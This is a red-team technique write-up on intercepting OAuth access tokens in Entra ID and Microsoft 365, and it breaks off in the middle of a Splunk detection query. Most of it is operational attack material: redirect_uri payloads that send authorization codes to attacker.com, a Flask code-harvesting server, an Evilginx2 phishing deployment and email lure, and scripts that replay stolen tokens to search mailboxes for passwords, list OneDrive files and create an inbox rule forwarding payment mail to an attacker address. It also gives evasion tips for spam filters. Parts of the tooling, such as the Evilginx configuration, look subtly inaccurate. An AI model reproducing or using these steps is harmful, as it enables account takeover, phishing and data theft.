# [CA-TOKEN-005]: OAuth Access Token Interception

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-005 |
| **MITRE ATT&CK v18.1** | [T1528 - Steal Application Access Tokens](https://attack.mitre.org/techniques/T1528/), [T1557 - Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID, M365, Cross-Cloud (AWS, GCP, Azure) |
| **Severity** | Critical |
| **CVE** | N/A (design inherent to OAuth 2.0) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | All OAuth 2.0 implementations, Entra ID (all versions), Office 365 (all versions) |
| **Patched In** | N/A (mitigated via device-bound tokens, Continuous Access Evaluation, and strict redirect_uri validation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** All section numbers have been dynamically renumbered based on applicability for this technique.

---

## 2. EXECUTIVE SUMMARY

**Concept:** OAuth access token interception is a credential access attack targeting the OAuth 2.0 authentication flow by stealing or hijacking tokens during transmission, at the authorization server, or during token exchange. Attackers employ three primary vectors: (1) exploiting open redirect vulnerabilities in the `redirect_uri` parameter to leak authorization codes or tokens directly, (2) positioning themselves as an Adversary-in-the-Middle (AiTM) using reverse proxy infrastructure (e.g., Evilginx2) to intercept both credentials and session tokens during the OAuth flow, and (3) replaying previously stolen refresh tokens to generate new access tokens indefinitely. Unlike simple credential theft, token interception bypasses MFA entirely (user already authenticated with the OAuth provider) and provides long-term persistence through refresh tokens.

**Attack Surface:** OAuth authorization endpoints (login.microsoftonline.com/authorize), token endpoints (login.microsoftonline.com/token), redirect URIs (both legitimate and compromised), browser authentication sessions, reverse proxy infrastructure, and MITM network positions.

**Business Impact:** **Complete account takeover without user re-authentication.** Attackers obtain valid OAuth tokens granting access to all resources consented by the user (email, calendar, Teams, SharePoint, OneDrive, etc.) with zero MFA friction. Unlike password compromise, token theft is **invisible to the user**—no forced password resets, no re-authentication prompts, no warnings. Tokens remain valid for hours (access tokens) to days/weeks (refresh tokens), enabling sustained data exfiltration, lateral movement to other cloud services, and post-compromise persistence through malicious OAuth app registration.

**Technical Context:** Token interception is stealthy because legitimate OAuth tokens used via API endpoints generate minimal audit trails compared to interactive logins. Detection is LOW unless specific monitoring for session reuse (same session ID from multiple IPs/geos) or unusual token usage patterns (bulk API calls, unusual scopes) is enabled. Reversibility is NONE—once tokens are stolen, they remain valid until manually revoked by the tenant.

### Operational Risk

- **Execution Risk:** Low to Medium - Evilginx2 phishing requires social engineering but automates token capture; open redirect exploitation requires identifying vulnerable redirect_uri validation; session hijacking requires network position or prior device compromise.
- **Stealth:** Very High - API calls appear legitimate; session tokens bypass MFA challenges; no suspicious process creation or command execution on user's machine.
- **Reversibility:** No - Tokens remain valid until expiration or explicit revocation. Refresh tokens enable indefinite access unless rotated.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.3.5 | Ensure MFA is enabled for all users (token theft bypasses MFA post-authentication) |
| **CIS Benchmark** | 5.1.1.1 | Ensure device compliance is required for OAuth clients (device-bound tokens prevent reuse) |
| **DISA STIG** | ID-000520 | API endpoint access controls and comprehensive audit logging |
| **CISA SCuBA** | Continuous Access Evaluation | Real-time token revocation when session conditions change |
| **NIST 800-53** | AC-3 | Access Enforcement - Strict redirect_uri validation and scope limitation |
| **NIST 800-53** | SC-7 | Boundary Protection - HTTPS enforcement, certificate pinning, TLS 1.2+ |
| **NIST 800-228** | API Protection for Cloud-Native Systems - Token binding, rate limiting, API key rotation |
| **GDPR** | Art. 32 | Security of Processing - Encryption of tokens in transit (TLS), device binding |
| **DORA** | Art. 9 | Protection and Prevention - Multi-factor authentication and token protection |
| **NIS2** | Art. 21 | Cyber Risk Management Measures - Token revocation procedures, session monitoring |
| **ISO 27001** | A.9.2.5 | Access Control - OAuth token lifecycle management and revocation |
| **ISO 27001** | A.10.1.1 | Cryptography - TLS 1.2+ for token transmission, token encryption |
| **ISO 27005** | Risk Scenario | "Compromise of Authentication Credentials" and "Unauthorized Access to APIs" |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - For open redirect exploitation: None (exploits server-side misconfiguration).
  - For AiTM attacks: Network position (MITM on user's network) or ability to control DNS/compromise router.
  - For token replay: Possession of valid access or refresh token.

- **Required Access:**
  - Network access to login.microsoftonline.com (or target OAuth provider).
  - For Evilginx2: Internet-facing VPS with public IP, valid TLS certificate matching phishing domain.

**Supported Versions:**
- **OAuth:** All 2.0 implementations (RFC 6749-6819 compliant).
- **Entra ID:** All versions (Token Protection support added 2023+).
- **Office 365:** All versions using OAuth 2.0 (Teams, Outlook, SharePoint, OneDrive).
- **PowerShell:** Version 5.0+ (for token manipulation and replay scripts).

**Tools:**
- [Evilginx2](https://github.com/kgretzky/evilginx2) (v2.3.0+) - Advanced MITM OAuth phishing framework.
- [Burp Suite](https://portswigger.net/burp) (v2024.x+) - OAuth flow interception and manipulation.
- [OWASP ZAP](https://www.zaproxy.org/) - Open-source OAuth vulnerability scanning.
- [AADInternals](https://o365blog.com/aadinternals/) - Token manipulation and analysis.
- [Custom Python Scripts](#custom-scripts) - Token extraction and replay utilities.

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

**Objective:** Identify whether target OAuth applications validate redirect URIs and assess token protection status.

```powershell
# Check Entra ID token protection policy status
Connect-MgGraph -Scopes "Policy.Read.All"

Get-MgPolicyConditionalAccessPolicy -Filter "displayName eq '*Token Protection*'" |
    Select-Object DisplayName, State, CreatedDateTime

# Check for device-bound token enforcement
Get-MgPolicyConditionalAccessPolicy |
    Where-Object { $_.GrantControls.BuiltInControls -contains "compliantDevice" } |
    Select-Object DisplayName, State

# Verify if refresh token lifetime is restricted
Get-MgPolicyTokenLifetimePolicy |
    Select-Object DisplayName, Definition

# Check for AiTM detection rules in Sentinel
az sentinel alert-rule list --resource-group SOC-RG --workspace-name Sentinel-Workspace `
    --query "[?displayName contains 'AiTM' || displayName contains 'Session']"
```

**What to Look For:**
- **Token Protection Policy:** Enabled = device-bound tokens required (harder to abuse).
- **Conditional Access:** Policies enforcing device compliance = tokens bound to registered devices.
- **Refresh Token Lifetime:** Short lifetimes (e.g., 7 days) = reduced persistence window.
- **AiTM Detection Rules:** Presence indicates organization is monitoring for session hijacking.

**Version Note:** Token Protection status (unbound vs. bound) is consistent across all Entra ID versions since 2023; older versions may not enforce device binding.

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Open Redirect via Malicious redirect_uri Parameter

**Supported Versions:** All OAuth 2.0 implementations with flawed redirect_uri validation.

#### Step 1: Identify Vulnerable OAuth Application

**Objective:** Discover OAuth applications with weak redirect_uri validation (accepting open redirects or pattern mismatches).

**Command (Using Burp Suite):**

1. Navigate to legitimate OAuth client application (e.g., internal SaaS app)
2. Initiate OAuth login; intercept request in Burp Proxy
3. Locate authorization request URL:
   ```
   https://login.microsoftonline.com/common/oauth2/v2.0/authorize?
   client_id=12345678-1234-1234-1234-123456789012&
   redirect_uri=https://myapp.company.com/oauth/callback&
   scope=Mail.Read+Chat.ReadWrite&
   response_type=code&
   state=abc123
   ```

4. Test redirect_uri validation by modifying it:
   ```
   redirect_uri=https://myapp.company.com/oauth/callback/../../admin
   redirect_uri=https://attacker.com/callback
   redirect_uri=https://myapp.company.com.attacker.com/callback
   ```

5. Send modified request; observe if OAuth provider rejects it or accepts it.

**Expected Output (Vulnerable):**
```
HTTP 302 Found
Location: https://attacker.com/callback?code=M.R3_BAY...&state=abc123
```

**Expected Output (Secure):**
```
HTTP 400 Bad Request
{
  "error": "invalid_request",
  "error_description": "The redirect URI 'https://attacker.com/callback' does not match a registered redirect URI."
}
```

**What This Means:**
- Vulnerable: OAuth server does not validate redirect_uri; attacker can capture authorization code.
- Secure: OAuth server rejects non-registered URIs (best practice).

**OpSec & Evasion:**
- Modifying redirect_uri in Burp is visible in proxy logs; consider using automated scripts offline.
- Detection likelihood: **Low if testing internally** (Burp activity not monitored by OAuth provider); **High if testing external systems** (probing attempts detected by WAF/rate limiting).

**Troubleshooting:**
- **Error:** "Invalid URI format"
  - **Cause:** OAuth server has basic URL validation.
  - **Fix:** Try directory traversal (`../`), wildcards (`*.company.com`), or subdomain variation (`sub.company.com`).

#### Step 2: Craft Malicious OAuth Authorization URL

**Objective:** Create a phishing URL that tricks users into authorizing OAuth flow while sending authorization code to attacker's domain.

**Command:**

```powershell
# Construct malicious OAuth URL with open redirect via redirect_uri
$clientId = "12345678-1234-1234-1234-123456789012"  # Legitimate app ID
$scope = "Mail.Read Chat.ReadWrite User.Read.All"
$maliciousRedirectUri = "https://legitimate-app.company.com/oauth/callback/../../external?url=https://attacker.com/steal"
$state = -join ((1..32) | ForEach-Object { [char][int](Get-Random -Minimum 48 -Maximum 122) })

$oauthUrl = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?" +
    "client_id=$clientId&" +
    "redirect_uri=$([System.Web.HttpUtility]::UrlEncode($maliciousRedirectUri))&" +
    "scope=$([System.Web.HttpUtility]::UrlEncode($scope))&" +
    "response_type=code&" +
    "state=$state"

Write-Host "Malicious OAuth URL:"
Write-Host $oauthUrl
```

**Expected Output:**
```
Malicious OAuth URL:
https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=12345678-1234-1234-1234-123456789012&redirect_uri=https%3A%2F%2Flegitimate-app.company.com%2Foauth%2Fcallback%2F..%2F..%2Fexternal%3Furl%3Dhttps%3A%2F%2Fattacker.com%2Fsteal&scope=Mail.Read%20Chat.ReadWrite%20User.Read.All&response_type=code&state=abc123def456
```

**What This Means:**
- User clicks malicious URL → authenticates with Microsoft → OAuth server processes request
- If redirect_uri validation is weak, OAuth redirects to open redirect endpoint, which forwards to attacker's domain
- Authorization code is captured by attacker's server before legitimate client can use it

**OpSec & Evasion:**
- URL is visible in email/messaging; consider using URL shortener (bit.ly, tinyurl) to obscure.
- Detection likelihood: **Medium** (phishing detection gateways may flag long/suspicious URLs).

**Troubleshooting:**
- **Error:** "Authorization code already used"
  - **Cause:** User clicked link twice or legitimate client intercepted code.
  - **Fix:** Generate new link with different state parameter.

#### Step 3: Extract Authorization Code from Attacker Server

**Objective:** Receive and parse the authorization code from the malicious redirect.

**Command (Python Flask server):**

```python
from flask import Flask, request
import json

app = Flask(__name__)

@app.route('/steal', methods=['GET'])
def steal_code():
    auth_code = request.args.get('code')
    state = request.args.get('state')
    
    if auth_code:
        # Log the code for later use
        with open('/tmp/stolen_codes.txt', 'a') as f:
            f.write(f"Code: {auth_code}\nState: {state}\n\n")
        
        print(f"[+] Authorization code captured: {auth_code[:50]}...")
        
        # Redirect to legitimate site to avoid suspicion
        return redirect("https://legitimate-app.company.com/dashboard")
    else:
        return "No code received", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc')
```

**Expected Output:**
```
[+] Authorization code captured: M.R3_BAY.Cjnk5NvA7...
```

**What This Means:**
- Authorization code is valid and single-use; must be exchanged for access token immediately.
- Code has short lifetime (typically 10 minutes); must be processed quickly.

**OpSec & Evasion:**
- Flask server generates HTTPS warnings if using self-signed certs; use Let's Encrypt.
- Detection likelihood: **Very Low** (attacker server is external infrastructure).

**Troubleshooting:**
- **Error:** "No code received"
  - **Cause:** User did not complete OAuth flow or redirect URI validation rejected request.
  - **Fix:** Verify redirect_uri is correctly exploiting open redirect; test with legitimate redirect_uri first.

#### Step 4: Exchange Authorization Code for Access Token

**Objective:** Convert authorization code to access token by making server-to-server request to OAuth token endpoint.

**Command (PowerShell):**

```powershell
# Exchange authorization code for access token
$authCode = "M.R3_BAY.Cjnk5NvA7..."  # From previous step
$clientId = "12345678-1234-1234-1234-123456789012"
$clientSecret = "VerySecretClientSecret123"  # If available (confidential client)
$tenantId = "common"

$tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"

$tokenBody = @{
    client_id    = $clientId
    client_secret = $clientSecret
    code         = $authCode
    redirect_uri = "https://legitimate-app.company.com/oauth/callback"  # Must match original registration
    grant_type   = "authorization_code"
    scope        = "https://graph.microsoft.com/.default"
}

$response = Invoke-WebRequest -Uri $tokenUrl -Method POST -Body $tokenBody -ContentType "application/x-www-form-urlencoded"
$tokens = $response.Content | ConvertFrom-Json

Write-Host "[+] Access Token: $($tokens.access_token.Substring(0, 50))..."
Write-Host "[+] Refresh Token: $($tokens.refresh_token.Substring(0, 50))..."
Write-Host "[+] Token Expires In: $($tokens.expires_in) seconds"

# Save tokens for later use
$tokens | ConvertTo-Json | Out-File -Path "C:\temp\stolen_tokens.json"
```

**Expected Output:**
```
[+] Access Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1d...
[+] Refresh Token: 0.AVAAp4-4Zz4n7EuI_pRQ...
[+] Token Expires In: 3600 seconds
```

**What This Means:**
- Access token is now valid for all scopes user consented to (Mail.Read, Chat.ReadWrite, etc.).
- Refresh token allows generating new access tokens for extended period (weeks/months).
- Attacker can now use tokens to access user's resources via Microsoft Graph API.

**OpSec & Evasion:**
- Token exchange is server-to-server (no user involvement); generates minimal audit logs.
- Detection likelihood: **Low** (legitimate authorization code → token exchange is normal).

**Troubleshooting:**
- **Error:** "invalid_grant - The provided authorization code is invalid"
  - **Cause:** Code expired (>10 minutes old) or already used.
  - **Fix:** Repeat from Step 2 to get fresh authorization code.
- **Error:** "invalid_client - The specified client_secret does not match"
  - **Cause:** Client secret incorrect or client is public (no secret needed).
  - **Fix:** If public client, omit client_secret parameter.

---

### METHOD 2: Adversary-in-the-Middle (AiTM) OAuth Interception via Evilginx2

**Supported Versions:** All OAuth 2.0 providers (Microsoft Entra ID, Google, Okta, etc.).

#### Step 1: Deploy Evilginx2 Reverse Proxy

**Objective:** Set up MITM reverse proxy to intercept OAuth credentials and session tokens.

**Command (on attacker VPS):**

```bash
# Download and compile Evilginx2
cd /opt
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Create phishing configuration for Microsoft OAuth
cat > config.yaml <<'EOF'
{
  "siteName": "Microsoft",
  "siteURL": "login.microsoftonline.com",
  "siteDescription": "Entra ID OAuth",
  "author": "Attacker",
  "redirect": "https://portal.azure.com",
  "phishlets": [
    {
      "name": "o365",
      "subdomain": "login",
      "cloneURI": "https://login.microsoftonline.com",
      "forms": [
        {
          "path": "/SSODone",
          "formname": "",
          "action": "https://login.microsoftonline.com/common/oauth2/nativeclient",
          "method": "POST",
          "fields": [
            { "fieldname": "username", "displayname": "Email", "value": "", "regex": ".*" },
            { "fieldname": "password", "displayname": "Password", "value": "", "regex": ".*" }
          ]
        }
      ]
    }
  ]
}
EOF

# Generate TLS certificate (use Let's Encrypt for valid cert)
certbot certonly --standalone -d login-azure.attacker.com

# Start Evilginx2
./evilginx2 -l 0.0.0.0 -p 443 -c config.yaml \
    -key /etc/letsencrypt/live/login-azure.attacker.com/privkey.pem \
    -cert /etc/letsencrypt/live/login-azure.attacker.com/fullchain.pem
```

**Expected Output:**
```
[*] Evilginx2 v2.3.0 started on 0.0.0.0:443
[+] Config loaded: Microsoft OAuth
[+] Phishing page ready at: https://login-azure.attacker.com/
[+] Listening for HTTPS connections...
```

**What This Means:**
- Evilginx is now intercepting OAuth flows on attacker domain.
- Users visiting login-azure.attacker.com see pixel-perfect fake Microsoft login.
- All credentials and tokens are captured in real-time.

**OpSec & Evasion:**
- Domain must look legitimate (login-azure.com similar to login.microsoftonline.com).
- TLS certificate must be valid (not self-signed) to avoid browser warnings.
- Consider using dynamic DNS or CDN (Cloudflare) to hide origin server IP.
- Detection likelihood: **High** (phishing URL detection by email gateways, domain reputation services).

**Troubleshooting:**
- **Error:** "Certificate verification failed"
  - **Cause:** Let's Encrypt certificate not properly installed.
  - **Fix:** Verify cert files exist; use `certbot certificates` to list.
- **Error:** "Port 443 already in use"
  - **Cause:** Another service using HTTPS port.
  - **Fix:** Kill competing process or use alternate port (8443) with port forwarding.

#### Step 2: Create Phishing Lure & Social Engineering

**Objective:** Trick users into clicking phishing link and entering credentials on fake login page.

**Command (Email phishing example):**

```html
Subject: ACTION REQUIRED: Verify Your Microsoft Account Security

<p>Dear User,</p>

<p>We detected unusual sign-in activity on your Microsoft account from an unrecognized device. 
For security reasons, please verify your identity by clicking the link below:</p>

<a href="https://login-azure.attacker.com/?redirect=https://portal.azure.com">
Verify Account Now
</a>

<p>This verification is required to protect your account from unauthorized access.</p>

<p>Microsoft Security Team</p>
```

**Alternative (QR Code Phishing):**

```bash
# Generate QR code pointing to phishing URL
qrencode -o /tmp/phish.png "https://login-azure.attacker.com/"

# Attach QR code to email with text: "Scan with your phone to verify"
```

**Expected Outcome:**
```
User clicks link → redirected to login-azure.attacker.com → 
User sees authentic-looking Microsoft login → 
User enters credentials (username, password, MFA code) →
Evilginx captures everything
```

**What This Means:**
- User's credentials are now in attacker's possession.
- More importantly, Evilginx is positioned as MITM between user's browser and real Microsoft OAuth server.

**OpSec & Evasion:**
- Email domain should appear legitimate (use similar domain or compromised corporate account).
- Avoid suspicious keywords (verify, urgent, confirm immediately) that trigger phishing filters.
- Detection likelihood: **High** (email gateway scanning, user awareness).

**Troubleshooting:**
- **Error:** "Email blocked by spam filter"
  - **Cause:** Phishing detection by Microsoft Defender for Office 365 or Proofpoint.
  - **Fix:** Use obfuscation, URL shorteners, or compromised internal email account.

#### Step 3: Intercept OAuth Session Token & Credential Relay

**Objective:** Capture session cookies/tokens as user authenticates through Evilginx MITM proxy.

**Command (Automatic via Evilginx):**

```bash
# Evilginx2 automatically:
# 1. Receives credentials from user's browser
# 2. Relays credentials to real Microsoft OAuth server
# 3. Intercepts session cookies/OAuth tokens returned by Microsoft
# 4. Stores tokens in Evilginx database

# To view captured sessions:
./evilginx2 -admin  # Opens admin console
> sessions  # Lists all captured sessions
> show session <ID>  # Display full session data including tokens

# Output example:
SessionID: 12345
Username: user@contoso.com
Password: [REDACTED]
SessionCookie: MSAuthToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Im1...
AccessToken: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjFXV...
RefreshToken: 0.AVAAp4-4Zz4n7EuI_pRQ...
Token_Expires_In: 3600
```

**Expected Output:**
```
[+] Credentials captured for user@contoso.com
[+] MFA code verified by real Microsoft server
[+] Session cookies intercepted: MSAuthToken=eyJ0eX...
[+] Access token obtained: eyJ0eXAiOiJ...
[+] Refresh token obtained: 0.AVAAp4-4...
```

**What This Means:**
- Evilginx has successfully MITM'd the OAuth flow.
- User's session is now "owned" by attacker; same cookies/tokens are available for replay.
- User continues to legitimate portal (sees no error); attack is invisible to user.

**OpSec & Evasion:**
- Evilginx logs are stored locally on attacker VPS; secure or delete after campaign.
- User's activity (after logging in through Evilginx) may appear from attacker's IP, not user's IP.
- Detection likelihood: **Medium** (sign-in from unusual IP, but credentials are legitimate and MFA was satisfied).

**Troubleshooting:**
- **Error:** "No sessions captured"
  - **Cause:** Users never clicked phishing link or browser blocked MITM.
  - **Fix:** Verify phishing email delivery; test Evilginx with manual click.
- **Error:** "Certificate pinning blocked interception"
  - **Cause:** Modern browsers (Chrome 80+) use certificate pinning for Microsoft domains.
  - **Fix:** Use app-level MITM (Frida on mobile) or trick users into uninstalling browser security extensions.

#### Step 4: Replay Session Tokens to Access Protected Resources

**Objective:** Use captured session cookies or access tokens to impersonate user without re-authentication.

**Command (PowerShell using captured token):**

```powershell
# Import captured tokens from Evilginx
$stolenTokens = @{
    AccessToken  = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjFXV..."
    RefreshToken = "0.AVAAp4-4Zz4n7EuI_pRQ..."
    SessionId    = "12345abcde"
}

# Create authorization header using stolen access token
$authHeader = @{
    "Authorization" = "Bearer $($stolenTokens.AccessToken)"
    "Content-Type"  = "application/json"
}

# Example 1: Access user's mailbox
$mailboxUrl = "https://graph.microsoft.com/v1.0/me/messages?`$top=10&`$search=`"password`""
$mailboxResult = Invoke-WebRequest -Uri $mailboxUrl -Headers $authHeader -Method GET
$emails = $mailboxResult.Content | ConvertFrom-Json
Write-Host "[+] Found $($emails.value.Count) emails containing 'password'"

# Example 2: Download OneDrive files
$driveUrl = "https://graph.microsoft.com/v1.0/me/drive/root/children"
$driveFiles = Invoke-WebRequest -Uri $driveUrl -Headers $authHeader -Method GET
$files = $driveFiles.Content | ConvertFrom-Json
Write-Host "[+] OneDrive contains $($files.value.Count) files"

# Example 3: Access Teams messages
$teamsUrl = "https://graph.microsoft.com/v1.0/me/chats"
$teamsChats = Invoke-WebRequest -Uri $teamsUrl -Headers $authHeader -Method GET
$chats = $teamsChats.Content | ConvertFrom-Json
Write-Host "[+] User has $($chats.value.Count) Teams chats"
```

**Expected Output:**
```
[+] Found 12 emails containing 'password'
[+] OneDrive contains 234 files
[+] User has 45 Teams chats
[+] Accessed resources as user@contoso.com (no re-authentication required)
```

**What This Means:**
- Stolen token grants full access to all user's resources.
- No MFA challenge, no re-authentication, no user notification.
- Attacker has complete access to email, files, Teams conversations for token lifetime (1 hour access token, days/weeks refresh token).

**OpSec & Evasion:**
- API calls appear to originate from user's authenticated session.
- Token usage from attacker's IP may trigger anomalies (impossible travel, unusual location).
- Detection likelihood: **High if monitoring API patterns** (bulk email searches, unusual file access); **Low if relying solely on login events** (MFA was satisfied).

**Troubleshooting:**
- **Error:** "Token expired"
  - **Cause:** Access token lifetime exceeded (1 hour default).
  - **Fix:** Use RefreshToken to mint new AccessToken: `Invoke-MsGraphRefreshToken -RefreshToken $stolenTokens.RefreshToken`
- **Error:** "Insufficient permissions"
  - **Cause:** User did not consent to required scope.
  - **Fix:** Use scopes within user's original consent; cannot escalate beyond user's permissions.

---

### METHOD 3: Session Token Hijacking via Direct Token Replay

**Supported Versions:** All OAuth 2.0 implementations.

#### Step 1: Obtain Valid Session Token (via prior compromise/phishing)

**Objective:** Acquire a valid, freshly-issued session token (from prior breach, malware, or Evilginx capture).

**Assumptions:**
- Attacker has previously compromised user's device or captured token via phishing.
- Token is fresh (within token lifetime, typically 1 hour for access tokens).

**Example Token (from Evilginx or browser developer tools):**

```
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjFXVXlWMmZqeWJxNTZQdGstLXJxYUJVck5sTkEiLCJraWQiOiIxV1V5VjJmanlicTU2UHRrLS1ycWFCVXJObExOQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20iLCJpc3MiOiJodHRwczovL3N0cy5taWNyb3NvZnQuY29tLzMzMzQyODczLTkzOTEtNGIzZS1iODMzLTU1ZTRlZTBjNzZmYS8iLCJpYXQiOjE2NzMyODEwMDAsImV4cCI6MTY3MzI4NDYwMCwibmFtZSI6IkpvaG4gRG9lIiwib2lkIjoiOTlkZDQyYWEtMjQyNi00NjQyLWI4YzgtMzI0NDU3ODkyOWY1IiwiYXBwX2Rpc3BsYXluYW1lIjoiTWljcm9zb2Z0IFRlYW1zIiwic2NwIjoiQ2hhdC5SZWFkV3JpdGUgTWFpbC5SZWFkIFVzZXIuUmVhZC5BbGwifQ.signature...
```

**What to Extract:**
- Bearer token value (entire JWT string after "Bearer ")
- Token expiration time (from JWT payload: `exp` field)
- User OID (from JWT payload: `oid` field)

**Command (Decode JWT to verify):**

```powershell
# Decode JWT token to verify contents
$token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjFXVXlWMmZqeWJxNTZQdGstLXJxYUJVck5sTkEiLCJraWQiOiIxV1V5VjJmanlicTU2UHRrLS1ycWFCVXJObExOQSJ9..."

$parts = $token.Split('.')
$payload = [Convert]::FromBase64String($parts[1] + "==")
$claims = [System.Text.Encoding]::UTF8.GetString($payload) | ConvertFrom-Json

Write-Host "[+] Token User: $($claims.name)"
Write-Host "[+] Token Expires: $(([datetime]'1970-01-01').AddSeconds($claims.exp))"
Write-Host "[+] Token Scopes: $($claims.scp)"
```

**Expected Output:**
```
[+] Token User: John Doe
[+] Token Expires: 01/08/2025 04:30:00
[+] Token Scopes: Chat.ReadWrite Mail.Read User.Read.All
```

**What This Means:**
- Token is valid for scopes listed; user can access all resources within those scopes.
- Token has remaining lifetime; attacker must use it before expiration.

#### Step 2: Replay Token from Attacker Device (No Re-Authentication)

**Objective:** Use stolen token from attacker's machine to access resources without user's knowledge.

**Command (Attacker's Python script):**

```python
import requests
import json
from datetime import datetime

# Stolen token from previous step
stolen_token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjFXVXlWMmZqeWJxNTZQdGstLXJxYUJVck5sTkEiLCJraWQiOiIxV1V5VjJmanlicTU2UHRrLS1ycWFCVXJObExOQSJ9..."

# Set up headers with stolen token
headers = {
    "Authorization": f"Bearer {stolen_token}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Example 1: List user's emails (search for passwords/credentials)
print("[*] Searching for emails with 'password'...")
search_query = {
    "requests": [
        {
            "entityTypes": ["message"],
            "query": "body:password OR subject:password OR body:admin OR subject:admin"
        }
    ]
}

response = requests.post(
    "https://graph.microsoft.com/v1.0/search/query",
    headers=headers,
    json=search_query
)

if response.status_code == 200:
    results = response.json()
    for item in results.get('value', []):
        print(f"[+] Found: {item['subject']} from {item['from']}")
else:
    print(f"[-] Error: {response.status_code} - {response.text}")

# Example 2: Download all OneDrive files
print("\n[*] Enumerating OneDrive files...")
drive_response = requests.get(
    "https://graph.microsoft.com/v1.0/me/drive/root/children?$select=id,name,webUrl",
    headers=headers
)

if drive_response.status_code == 200:
    files = drive_response.json()['value']
    for file in files:
        print(f"[+] File: {file['name']} - {file['webUrl']}")
else:
    print(f"[-] Error: {drive_response.status_code}")

# Example 3: Create malicious inbox rule (persistence)
print("\n[*] Setting up persistence via inbox rule...")
rule_payload = {
    "displayName": "Auto-Forward",
    "sequence": 1,
    "enabled": True,
    "conditions": {
        "bodyContains": ["invoice", "payment", "wire"]
    },
    "actions": {
        "forwardTo": [
            {
                "emailAddress": {
                    "name": "Security Team",
                    "address": "attacker@external.com"
                }
            }
        ]
    }
}

rule_response = requests.post(
    "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules",
    headers=headers,
    json=rule_payload
)

if rule_response.status_code == 201:
    print("[+] Inbox rule created - emails forwarded to attacker")
else:
    print(f"[-] Error creating rule: {rule_response.status_code}")
```

**Expected Output:**
```
[*] Searching for emails with 'password'...
[+] Found: Database credentials - Admin password from admin@company.com
[+] Found: Salesforce password reset - user@company.com
[+] Found: VPN credentials - IT Support from it@company.com

[*] Enumerating OneDrive files...
[+] File: Q4_Financial_Report.xlsx - https://...
[+] File: Customer_Database.csv - https://...
[+] File: Admin_Credentials.txt - https://...

[*] Setting up persistence via inbox rule...
[+] Inbox rule created - emails forwarded to attacker
```

**What This Means:**
- Attacker can access all resources user consented to without re-authentication.
- No MFA prompt, no user notification, no password required.
- Session persists for entire token lifetime (up to 1 hour for access tokens).
- Refresh tokens enable indefinite access (days/weeks) until token revocation.

**OpSec & Evasion:**
- API calls appear to come from legitimate user's token.
- IP address of attacker may differ from user's normal location (detected by Conditional Access if enabled).
- Detection likelihood: **High if monitoring API patterns** (bulk searches, unusual file access); **Low if no API monitoring**.

**Troubleshooting:**
- **Error:** "Token expired"
  - **Cause:** Access token lifetime exceeded.
  - **Fix:** If refresh token available, mint new access token. Otherwise, token is unusable.
- **Error:** "Insufficient privileges"
  - **Cause:** Token scopes don't include required permission.
  - **Fix:** Use within scope limitations; cannot escalate beyond user's permissions.

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1557.001 (MITM - ARP Spoofing) as conceptual match.
- **Test Name:** OAuth Token Interception via AiTM.
- **Description:** Deploy Evilginx2 MITM proxy and capture OAuth tokens from test user.
- **Supported Versions:** All.

**PoC Verification Command:**

```powershell
# Test 1: Verify OAuth application allows open redirects
$appUrl = "https://myapp.company.com/oauth/authorize?redirect_uri=https://attacker.com/callback"
$response = Invoke-WebRequest -Uri $appUrl -ErrorAction Continue
if ($response.StatusCode -eq 302) {
    Write-Host "[+] Open redirect vulnerability detected"
} else {
    Write-Host "[-] Open redirect blocked"
}

# Test 2: Verify token interception possible via MITM
# (Requires Evilginx2 deployed and configured)
# If phishing link clicked and user authenticates, Evilginx logs should show:
# [+] Credentials captured
# [+] Session tokens intercepted

# Test 3: Verify stolen token can be replayed
$authHeader = @{ "Authorization" = "Bearer <stolen_token>" }
$testUrl = "https://graph.microsoft.com/v1.0/me"
$me = Invoke-WebRequest -Uri $testUrl -Headers $authHeader
if ($me.StatusCode -eq 200) {
    Write-Host "[+] Token replay successful - access granted"
} else {
    Write-Host "[-] Token replay failed - access denied"
}
```

---

## 7. SPLUNK DETECTION RULES

### Rule 1: Suspicious OAuth Session Reuse (Same Session ID from Multiple IPs)

**Rule Configuration:**
- **Required Index:** azure_activity, azure_signinlogs
- **Required Fields:** SessionId, IPAddress, UserAgent, TimeGenerated, Location.CountryOrRegion
- **Alert Threshold:** Same SessionId from ≥2 different IPs within 30 minutes
- **Applies To Versions:** All

**SPL Query:**

```spl
index=azure_signinlogs 
| stats values(IPAddress), values(location.countryOrRegion), values(userAgent), count by sessionId, userId, userPrincipalName 
| where mvcount(IPAddress) > 1 
| eval ip_count=mvcount(IPAddress), country_count=mvcount(location.countryOrRegion) 
| where ip_count > 1 
| search country_count > 1 OR ip_count > 2 
